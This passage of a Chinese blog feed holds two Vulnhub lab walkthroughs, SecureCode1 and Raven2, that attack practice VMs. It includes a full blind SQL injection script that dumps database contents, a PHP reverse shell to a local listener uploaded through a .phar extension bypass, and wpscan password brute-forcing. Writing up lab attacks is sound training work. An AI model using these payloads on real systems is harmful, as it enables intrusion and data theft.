            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub_SecureCode1</title>
      <link href="/2024/02/17/Vulnhub-SecureCode1/"/>
      <url>/2024/02/17/Vulnhub-SecureCode1/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-SecureCode1靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-SecureCode1靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_SecureCode1靶场渗透"></a>【Vulnhub系列靶场】Vulnhub_SecureCode1靶场渗透</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>1、从百度网盘下载对应靶机的.ova镜像</p><p>2、在VM中选择【打开】该.ova</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209184001407.png" alt="image-20240209184001407"></p><p>3、选择存储路径，并打开</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209184019990.png" alt="image-20240209184019990"></p><p>4、之后确认网络连接模式是否为【NAT】</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><p><img src="/img/Vulnhub-SecureCode1/image-20240207163539575.png" alt="image-20240207163539575"></p><h3 id="2、端口探测"><a href="#2、端口探测" class="headerlink" title="2、端口探测"></a>2、端口探测</h3><p>1、快速粗略探测</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163617743.png" alt="image-20240207163617743"></p><p>只发现80端口</p><p>2、进行精细化探测</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163652742.png" alt="image-20240207163652742"></p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163700245.png" alt="image-20240207163700245"></p><p>仍然只有80端口</p><p>3、进行全扫描和漏洞探测</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163926406.png" alt="image-20240207163926406"></p><p>一个Ubuntu 的Linux机器</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163842603.png" alt="image-20240207163842603"></p><p>发现文件上传和SQL注入漏洞，是一个很好的开端</p><h3 id="3、对web目录爆破"><a href="#3、对web目录爆破" class="headerlink" title="3、对web目录爆破"></a>3、对web目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.61 -x 404,403#过滤404，403响应</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207164030015.png" alt="image-20240207164030015"></p><h3 id="4、web框架探测"><a href="#4、web框架探测" class="headerlink" title="4、web框架探测"></a>4、web框架探测</h3><p><img src="/img/Vulnhub-SecureCode1/image-20240207164250119.png" alt="image-20240207164250119"></p><p>使用了Bootstrap 的前端开发框架和JQuery 库</p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、查看敏感文件"><a href="#1、查看敏感文件" class="headerlink" title="1、查看敏感文件"></a>1、查看敏感文件</h3><p>1、robots.txt：提示禁止去&#x2F;login&#x2F;*，不允许访问login下的任何文件</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207170232753.png" alt="image-20240207170232753"></p><p>2、login目录：是一个登录页面</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207170321419.png" alt="image-20240207170321419"></p><p>3、查看其他目录提示无权限</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207182037225.png" alt="image-20240207182037225"></p><h3 id="2、源代码文件泄露"><a href="#2、源代码文件泄露" class="headerlink" title="2、源代码文件泄露"></a>2、源代码文件泄露</h3><p>1、对登录页面尝试SQL注入失败，几经周折无计可施</p><p>2、返回再进行信息收集，端口探测也并无其他端口开放，目录扫描也无其他结果</p><p>3、此时能用的有参数爆破，以及zip 等敏感文件的存在（还可以尝试子域名爆破，但由于是靶机且无域名存在，因此此路不通）</p><p>4、有include 目录的存在且发现include&#x2F;header.php 文件在其他地方也经过了引用，可以联想到文件包含漏洞，通过对参数进行爆破</p><p>我们在kali 中用wfuzz 工具对包含了header.php 文件的login.php页面进行爆破，并无收获</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt --hw 113 http://192.168.31.61/login/login.php?FUZZ=</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207190949073.png" alt="image-20240207190949073"></p><p>5、检索zip 等敏感文件</p><p>我们用dirb 这个工具，对敏感后缀进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.61  -X .php,.html,.rar,.7zip,.tar.gz,.gz,.zip,.bak</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207191226354.png" alt="image-20240207191226354"></p><p>可以看到确实存在一个名为源代码的zip 文件</p><p>将其下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.31.61/source_code.zip --output source_code.zip</span><br></pre></td></tr></table></figure><h3 id="3、代码审计登录后台"><a href="#3、代码审计登录后台" class="headerlink" title="3、代码审计登录后台"></a>3、代码审计登录后台</h3><p>解压该文件，发现存在一个.sql文件，莫不是数据库文件</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207191629744.png" alt="image-20240207191629744"></p><p>找到两个用户名和密码，用hashid 判别一下</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207191943474.png" alt="image-20240207191943474"></p><p>然后用john 进行爆破，没有结果</p><p>既然拿到了源代码，那就进行一波代码审计</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208180111100.png" alt="image-20240208180111100"></p><p>重点在这两个文件中</p><p>在doChangePassword.php 文件中，对token 进行了校验，然后可以进行密码修改的操作，这里应该是关键</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208174200635.png" alt="image-20240208174200635"></p><p>在 resetPassword.php文件中对token 进行了更新操作，那么我们拿到这个token 就可以对admin 的密码进行修改</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208180435447.png" alt="image-20240208180435447"></p><p>再往下看</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208182452736.png" alt="image-20240208182452736"></p><p>这里就是发送的邮件信息内容，在doChangePassword.php 后面加上token 的值去修改对应用户的密码</p><p>那么如何获取15位的token值，爆破难度太高，再查看源代码</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208190642976.png" alt="image-20240208190642976"></p><p>这个地方存在SQL注入的可能性很大，对&#x2F;item&#x2F;viewItem.php 文件进行查看</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208191024191.png" alt="image-20240208191024191"></p><p>如下，确认存在SQL注入</p><p><img src="/img/Vulnhub-SecureCode1/image-20240208191220609.png" alt="image-20240208191220609"></p><p>进行数据爆破，这里我写了一个脚本根据响应值来进行SQL注入，可修进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.31.62/item/viewItem.php?id=1&#x27;</span><br><span class="line"></span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):  #i是第几个字段的值</span><br><span class="line">        for j in range(1,column_data_len[i]+1):   #j是要爆破字段值的第几个字符</span><br><span class="line">            for n in range(0,126):  #n是要爆破字段值的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        print(f&quot;第&#123;i&#125;个字段的值为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">def column_data_length(column_names,User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):       #i是第几个字段的值，猜测10个数值</span><br><span class="line">        for j in range(1,20):     #j是要爆破字段数值的长度，猜测该字段数值最大为20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;已超过测试数值的最大值，请调整！！！&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):  #i是第几个字段，len(column_len) 是字段的数量</span><br><span class="line">        for j in range(1,column_len[i]+1):           #j是要爆破字段的第几个字符</span><br><span class="line">            for n in range(0,126):     #n是要爆破字段名的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;第&#123;i&#125;个字段的名称为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">def column_length(User_table_name):     #要查看的表名</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):       #i是第几个字段，这里假设有10个字段</span><br><span class="line">        for j in range(1,30):     #j是要爆破字段的长度，假设字段长度最长为20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;已超过测试字段数的最大值，请调整！！！&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):   #i是第几张表，len(table_len)表示共有几张表</span><br><span class="line">        for j in range(1,table_len[i]+1):           #j是要爆破表名第几个字符，到表的长度</span><br><span class="line">            for n in range(0,126):     #n是要爆破表名的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    table_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;第&#123;i&#125;张表的名称为：&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):        #i是第几张表</span><br><span class="line">        for j in range(1,10):     #j是要爆破表的长度</span><br><span class="line">            new_url = url + &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    for i in range(1,database_len + 1):     #i是数据库的第几个字符</span><br><span class="line">        for j in range(0,126):          #j是要爆破数据库名的ascii码值</span><br><span class="line">            new_url = url + &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                database_names += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">def database_length():</span><br><span class="line">    for i in range(1,10):   #假设数据库的长度在10以内</span><br><span class="line">        new_url = url + &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">        if Response_judgment(new_url):</span><br><span class="line">            return i</span><br><span class="line">    print(&#x27;payload无效，请更替payload！！！&#x27;)</span><br><span class="line"></span><br><span class="line">def Response_judgment(new_url):</span><br><span class="line">    respone = requests.get(new_url)</span><br><span class="line">    if respone.status_code == 404:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    database_names = database_name(database_length())    #这里传入数据库的长度</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;数据库的名称为：&#123;database_names&#125;&quot;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    table_names = table_name(table_length())    #求表的名称，传入表的长度</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;所有表的名称为：&#123;table_names&#125;&quot;)</span><br><span class="line">    User_table_name = input(&#x27;请输入要查看的表名：&#x27;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    column_names = column_name(column_length(User_table_name),User_table_name)       #求字段的名字，输入字段的长度</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;该表中所有字段的名称为：&#123;column_names&#125;&quot;)</span><br><span class="line">    User_column_name = input(&#x27;请输入要查看的字段名：&#x27;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    column_data_len = column_data_length(column_names,User_table_name,User_column_name)   #求字段值的长度，传入字段的名称</span><br><span class="line">    column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #求字段的值</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(f&quot;该字段中所有数值为：&#123;column_data_names&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209161542518.png" alt="image-20240209161542518"></p><p>拿到token，进入doChangePassword.php?token&#x3D;iBWWtGgLTA8KqEa，之后修改admin 的密码，提示密码更改成功</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209161258109.png" alt="image-20240209161258109"></p><p>之后进行登录，成功登录后台</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209161632922.png" alt="image-20240209161632922"></p><h3 id="4、获取shell立足点"><a href="#4、获取shell立足点" class="headerlink" title="4、获取shell立足点"></a>4、获取shell立足点</h3><p>1、在后台进行信息收集，发现flag1</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209163602954.png" alt="image-20240209163602954"></p><p>2、在添加材料的地方发现文件上传</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209163746214.png" alt="image-20240209163746214"></p><p>3、先上传一个phpinfo文件，发现有限制</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209164006481.png" alt="image-20240209164006481"></p><p>4、在源代码上看，是做了黑名单和mime 检测</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209164347008.png" alt="image-20240209164347008"></p><p>5、抓包绕过，黑名单中并没有phar后缀</p><p>我们上传一个.phar后缀的php反弹shell，并在本地进行监听，成功拿到shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.50/4444 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209171953541.png" alt="image-20240209171953541"></p><h1 id="四、提权root"><a href="#四、提权root" class="headerlink" title="四、提权root"></a>四、提权root</h1><h3 id="1、查找敏感文件"><a href="#1、查找敏感文件" class="headerlink" title="1、查找敏感文件"></a>1、查找敏感文件</h3><p>1、在&#x2F;var&#x2F;www下找到flag2</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209172416582.png" alt="image-20240209172416582"></p><p>其中的legendary 让人很在意，尝试su 到普通用户 secure</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell=/bin/bash script -q /dev/null</span><br><span class="line">su secure</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240209172544562.png" alt="image-20240209172544562"></p><p>失败了</p><p>2、connection.php文件</p><p>看到数据库的账号密码：hackshop:hackshopuniquepassword</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209172719676.png" alt="image-20240209172719676"></p><p>是否满足数据库提权呢？mysql版本大于5.7，不能进行数据库提权</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209173207183.png" alt="image-20240209173207183"></p><h3 id="2、提权root"><a href="#2、提权root" class="headerlink" title="2、提权root"></a>2、提权root</h3><p>此靶机无需root提权</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_Raven2</title>
      <link href="/2024/02/17/Vulnhub-Raven2/"/>
      <url>/2024/02/17/Vulnhub-Raven2/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Raven2-渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Raven2-渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_Raven2 渗透"></a>【Vulnhub系列靶场】Vulnhub_Raven2 渗透</h1><h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>从网盘下载该靶机，在vm中选择【打开】</p><p><img src="/img/Vulnhub-Raven2/image-20240206132421898.png" alt="image-20240206132421898"></p><p>然后设置好存储路径，开机后检查靶机的网络连接模式是否为【NET】模式。</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205150548983.png" alt="image-20240205150548983"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>1、先进行粗略的扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.60</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205150656838.png" alt="image-20240205150656838"></p><p>2、再进行精细化扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.60</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.60</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205154034080.png" alt="image-20240205154034080"></p><p><img src="/img/Vulnhub-Raven2/image-20240205151907050.png" alt="image-20240205151907050"></p><p>3、进行全扫描和漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p 22,80,111,54798,58157 192.168.31.60 -oA AllPort</span><br><span class="line"> nmap.exe --script=vuln -p 22,80,111,54798,58157 192.168.31.60 -oA VulnPort</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205154417067.png" alt="image-20240205154417067"></p><p>确认是Linux操作系统，并且开放了111的rpcbind服务，有关这个服务可以上网搜索，也有很多该服务相关漏洞，后期是一个可利用的点。</p><p><img src="/img/Vulnhub-Raven2/image-20240205154452871.png" alt="image-20240205154452871"></p><p>发现使用了wordpress框架，进行了目录的扫描，还发现有一个csrf 的漏洞，不过这个漏洞在个人渗透过程中起到的作用微乎甚微。</p><h3 id="3、web目录探测"><a href="#3、web目录探测" class="headerlink" title="3、web目录探测"></a>3、web目录探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.60 -x 404,403#过滤404、403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205151054134.png" alt="image-20240205151054134"></p><p>看到有wordpress，疑似wordpress搭建的博客网站。</p><h3 id="4、web框架探测"><a href="#4、web框架探测" class="headerlink" title="4、web框架探测"></a>4、web框架探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.60#在kali中用whatweb进行识别</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205151433137.png" alt="image-20240205151433137"></p><p>并未探测到wordpress框架，那我们去探测wordpress这个路径</p><p><img src="/img/Vulnhub-Raven2/image-20240205151835831.png" alt="image-20240205151835831"></p><p>可以看到确定使用了wordpress框架。</p><h1 id="三、获得shell立足点"><a href="#三、获得shell立足点" class="headerlink" title="三、获得shell立足点"></a>三、获得shell立足点</h1><h3 id="1、敏感信息查看"><a href="#1、敏感信息查看" class="headerlink" title="1、敏感信息查看"></a>1、敏感信息查看</h3><p>1、.DS_Store文件：是macOS 操作系统的文件类型。它是由 Finder（Mac 上的文件管理器）创建的隐藏文件，用于存储有关特定文件夹的视图选项和元数据。</p><p>可以用GitHub的工具对其进行解析：<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py .DS_Store</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205155926915.png" alt="image-20240205155926915"></p><p>并没有发现有用的信息</p><h3 id="2、Vendor路径信息收集"><a href="#2、Vendor路径信息收集" class="headerlink" title="2、Vendor路径信息收集"></a>2、Vendor路径信息收集</h3><p>vendor&#x2F;PATH：发现了一个flag1</p><p><img src="/img/Vulnhub-Raven2/image-20240205160305176.png" alt="image-20240205160305176"></p><p>在&#x2F;vendor&#x2F;readme.md中发现PHPMailer，百度百科解释：是一个用于发送电子邮件的PHP函数包。直接用PHP就可以发送，无需搭建复杂的Email服务。 </p><p><img src="/img/Vulnhub-Raven2/image-20240205171224387.png" alt="image-20240205171224387"></p><p>&#x2F;vendor&#x2F;VERSION发现版本为5.2.16</p><p><img src="/img/Vulnhub-Raven2/image-20240205171505826.png" alt="image-20240205171505826"></p><p>有关这个版本的漏洞也有很多</p><p><img src="/img/Vulnhub-Raven2/image-20240205171639908.png" alt="image-20240205171639908"></p><h3 id="3、wordress框架信息收集"><a href="#3、wordress框架信息收集" class="headerlink" title="3、wordress框架信息收集"></a>3、wordress框架信息收集</h3><p>继续将目标转移至 wordpress目录框架，对该目录再进行一次目录扫描</p><p><img src="/img/Vulnhub-Raven2/image-20240205160829021.png" alt="image-20240205160829021"></p><p>我们访问wp-admin的时候发生了错误：</p><p><img src="/img/Vulnhub-Raven2/image-20240205162944210.png" alt="image-20240205162944210"></p><p>一而再三的确认是wordpress 框架，这里不应该报错，可能是hosts解析。</p><p>我们打开系统组件中的hosts 文件</p><p><img src="/img/Vulnhub-Raven2/image-20240205163105055.png" alt="image-20240205163105055"></p><p>添加如下本地hosts 文件的IP解析</p><p><img src="/img/Vulnhub-Raven2/image-20240205162546551.png" alt="image-20240205162546551"></p><p>重新打开即可。</p><p><img src="/img/Vulnhub-Raven2/image-20240205163213369.png" alt="image-20240205163213369"></p><p>wp-content&#x2F;uploads路径下发现了flag3</p><p><img src="/img/Vulnhub-Raven2/image-20240205165525290.png" alt="image-20240205165525290"></p><h3 id="4、wordpress框架利用工具-wpscan"><a href="#4、wordpress框架利用工具-wpscan" class="headerlink" title="4、wordpress框架利用工具-wpscan"></a>4、wordpress框架利用工具-wpscan</h3><p>wpscan是专门针对wordpress利用的工具：</p><p>1、用户名扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.60/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205171928756.png" alt="image-20240205171928756"></p><p>有steven michael两个用户，将其保存在user.txt文件中</p><p>2、进行密码爆破</p><p>我们可以用密码生成工具cewl 针对wordpress生成专门的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.31.60/wordpress/ -w pass.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172053643.png" alt="image-20240205172053643"></p><p>之后在进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url &quot;http://192.168.31.60/wordpress/&quot; -P &quot;pass.txt&quot; --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172154945.png" alt="image-20240205172154945"></p><p><img src="/img/Vulnhub-Raven2/image-20240205172249849.png" 